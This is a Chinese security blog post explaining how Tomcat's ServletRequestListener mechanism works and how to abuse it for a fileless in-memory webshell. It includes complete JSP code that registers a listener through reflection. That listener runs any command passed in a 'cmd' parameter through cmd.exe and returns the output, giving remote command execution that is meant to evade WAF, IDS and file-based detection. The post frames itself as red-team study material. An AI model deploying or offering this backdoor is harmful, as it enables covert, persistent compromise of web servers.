> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/msjeTiQfAsLbGUHI36-ZsQ)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3wN9B5nbnc4SLeLK659YicuTaJ3eicWA6pibZgians1GgB5G9FNricooBHeQ/640?wx_fmt=png)

  

  

  

背景

  

  

  

基于现阶段红蓝对抗强度的提升，诸如 WAF 动态防御、态势感知、IDS 恶意流量分析监测、文件多维特征监测、日志监测等手段，能够及时有效地检测、告警甚至阻断针对传统通过文件上传落地的 Webshell 或需以文件形式持续驻留目标服务器的恶意后门。结合当下形势，对 Tomcat 容器如何利用 Listener 实现的内存 Webshell 进行研究学习。

  

  

  

声明

  

  

  

由于传播或利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，此文仅作交流学习用途。

  

  

  

什么是 Listener

  

  

  

Listener 译文监听器，顾名思义用于监听事件的发生或状态的改变。

  

  

  

Tomcat 为什么要引入 Listener

  

  

  

Tomcat 在启动、运行、关闭等各个过程中，由于环境中对象之间的依赖关系复杂，对象的属性和状态会发生各种改变，一个对象的改变需要通知其他依赖于它的对象，以此保证高度的协同合作，而 Listener 的引入，正是为了解决该问题。

这种行为模式，也称为观察者模式。

  

  

  

Listener 的实现和类型

  

  

  

Tomcat 使用两类 Listener 接口分别是 org.apache.catalina.LifecycleListener 和原生 Java.util.EvenListener。

LifecycleListener 增加了生命周期管理，主要用于四大容器类 StandardEngine、StandardHost、StandardContext、StandardWrapper。相关的类和接口列出如下，看下图三，Lifecycle 接口定义了运行状态，用于容器状态的判断和管理。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3RMI9niaTVS8KrBWYzXMRibhsAbv2HolBKJ6vC5jUAUDAntIuEQ5KEY0Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs37cjd78fFVHYoU4jRL1ia98HsnyLpbAVZ4RRrnEBe2yKib0muY2aEbYvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3pn5BzMxnzsE8Go8cGndhUn7ycv0AMVyD9JUvkaImKeVwRMxm0drHVg/640?wx_fmt=png)

但我们这次不讲 LifecycleListener，原因是它们多用于 Tomcat 初始化启动阶段，那时客户端的请求还没进入解析阶段，也就是说不能通过请求，随心所欲根据我们的输入执行命令。  
所以，让我们来看看 EvenListener。EvenListener 接口很简单，简单到啥也没有。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3q1ybJNIjYTcmyic9f7IJkozhYz39PKM1dj7e5aYbm3ooibaEkx6fac2g/640?wx_fmt=png)

原生 Tomcat 中，自定义了很多继承于 EventListener 的接口，应用于各个对象的监听。下图列举一些常见的监听器接口。  

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3Umnmv25icGKZpVb3R3HibnldcxhAXI754qvq7ZkxWfYragDaBFiaSicNVw/640?wx_fmt=png)

我们主要来关注箭头指向的 ServletRequestListener，可能会好奇这么多不选，而要挑 ServletRequestListener，既然要实现 Webshell，理所当然希望它能接收我们任意的输入以及随心所欲控制响应，因此我们需找到一个 Tomcat 解析了请求后但仍未响应的中间环节。而 ServletRequestListener 是一个很好选择，来看看为什么。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3W9v9k0cYiboUibLKAU6Wx6KIZdzODGRYtWmezcQnpaUFCsx1LeFfzFrg/640?wx_fmt=png)

ServletRequestListener 用于监听 ServletRequest 的生成和销毁，也就是当我们访问任意资源，无论是 servlet、jsp 还是静态资源，都会触发 requestInitialized 方法。继续看，在哪个环节，什么时候，哪个地方会调用监听器。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3IUbxMKnbC0Mw9qDib7Ualaia3QWowwb15ANC62ibYrnpjWZX16kn8e0eA/640?wx_fmt=png)

具体在 StandardHostValve 调用下一个阀之前调用 context.fireRequestInitEvent(request.getRequest())，进而调用 ServletRequestListener。

了解 Tomcat 处理流程的应该知道，请求在 CoyoteAdapter#service() 方法中生成 ServletRequest 对象并完成解析，下个流程是到 Engine、Container 中进行处理，而 StandardHostValve 正是 Container 中的环节，到这一步时，我们的请求参数已经被 Tomcat 解析完毕并保存在 Request 对象里了，继续往下看。

此处的 context 是 StandardContext，来看 fireRequestInitEvent()。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3xhiaGJInbfQA4O3DRiaDuKjseLRu5GMSMys95arKH4zZynEeBZg6I9Tg/640?wx_fmt=png)

通过 this.getApplicationEventListeners(); 获取成员属性 ApplicationEventListeners 中的监听器，然后生成 ServletRequestEvent 事件对象，而后通过 for 循环，遍历调用 (ServletRequestListener) listener.requestInitialized(event);

而 requestInitialized 就是继承 ServletRequestLisner 接口要实现的方法。

经过以上分析，大致了解，Tomcat 执行到 StandardHostValve#invoke() 时，获取存储在 StandardContext.ApplicationEventListeners 中的监听器，并遍历调用 listener#requestInitialized()  
那注入 listener 马，我们只需要新建一个继承 ServletRequestLisner 接口的监听器并在 requestInitialized 方法中实现我们想要的任意功能，然后将该实例添加到 StandardContext 的 ApplicationEventListeners 变量就大功告成了。

默认情况 ApplicationEventListeners 为空，不存在监听器，这里如此设计是为了给开发者提供更多的功能扩展空间。

  

  

  

编写代码

  

  

  

导入的包：

```
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.io.IOException" %>

```

编写监听器：

```
<%!
    public class myListener implements ServletRequestListener {
        public void requestDestroyed(ServletRequestEvent sre) {

            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            if (req.getParameter("cmd") != null){
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String out = s.hasNext()?s.next():"";
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    request.getResponse().getWriter().write(out);
                }
                catch (IOException e) {}
                catch (NoSuchFieldException e) {}
                catch (IllegalAccessException e) {}
            }
        }

        public void requestInitialized(ServletRequestEvent sre) {}
    }
%>

```

```
// 一个小路径快速获得StandardContext
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>

```

添加监听器:

```
<%
myListener listenerdemo = new myListener();
    context.addApplicationEventListener(listenerdemo);
%>

```

  

  

  

补充细节

  

  

  

（1）关于 *.jsp 页面中的 request 对象实际上是 RequestFacade 对象，这里采用的是门面模式，将复杂的对象转化成一个简单易操作的对象，提供一个简单入口的同时也是为了保证原有对象的独立性。而 RequestFacade 就是 org.apache.catalina.connector.Request 对象的门面。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs34Ibr2JmSVju0Nm9OSzibMCu032j8NNYrLpaKkDFvnjC8JZ3E5RwcHUQ/640?wx_fmt=png)

（2）还记得调用 ServletRequestListener 的入口不？context.fireRequestInitEvent(request.getRequest())，这里的 request.getRequest() 得到的也是 Request 对象的门面，可别搞错咯。所以上面我使用了反射得到 RequestFacade 里的 Request，进而得到 Response 控制输出。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3R1Hrb7OiaEf0y3PBpfFdPXAnwgcCiaMtb45QEtDxkLh6c4gfuI869LEA/640?wx_fmt=png)

  

  

  

效果

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6PibV9pl64N7CAkvU28mQs3RCyd2aKSnaRl7GPuRyUmnJEyvW19uqPooialoiaTXayzQrOFPRia1niceA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)
----------------------------------------------------------------------------------------------------------------------------------------------

  

- End -  

精彩推荐

[CVE-2020-2555——Coherence 反序列化初探](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737519&idx=1&sn=9edab2f2de7cb979e8f45c5c9712e374&chksm=888cf940bffb70566b55a38c0820fa7038acecd881679868e5d1f278cf1a1f3f086c0f6b92ca&scene=21#wechat_redirect)  

[纵横杯线上初赛部分题解](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737447&idx=1&sn=0891747d7718b1db6e20ed378fd12a2d&chksm=888cf888bffb719ef262466c6b9fd34dac6377cd4efd303dd7e9b8da30dd60d66572f515fb6d&scene=21#wechat_redirect)  

[越南已经成为复杂供应链攻击的主要目标](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737407&idx=1&sn=e22caa66b5e464df0235fe4241867b67&chksm=888cf8d0bffb71c631894ab899988a15dee8018116dffa2c557b8de5356a07c9a1169d9821fb&scene=21#wechat_redirect)  

[芬兰议会称议员邮箱遭黑客入侵](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649737406&idx=1&sn=525fdc25525e80a0e0c7086befed67bb&chksm=888cf8d1bffb71c7c38f955127956ab208f18b2977bab0ec2f2cfde6ae7901ccc8aae595e704&scene=21#wechat_redirect)

  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

---------------------------------------------------------------------------------------------------------------------------------------------------

**戳 “阅读原文” 查看更多内容**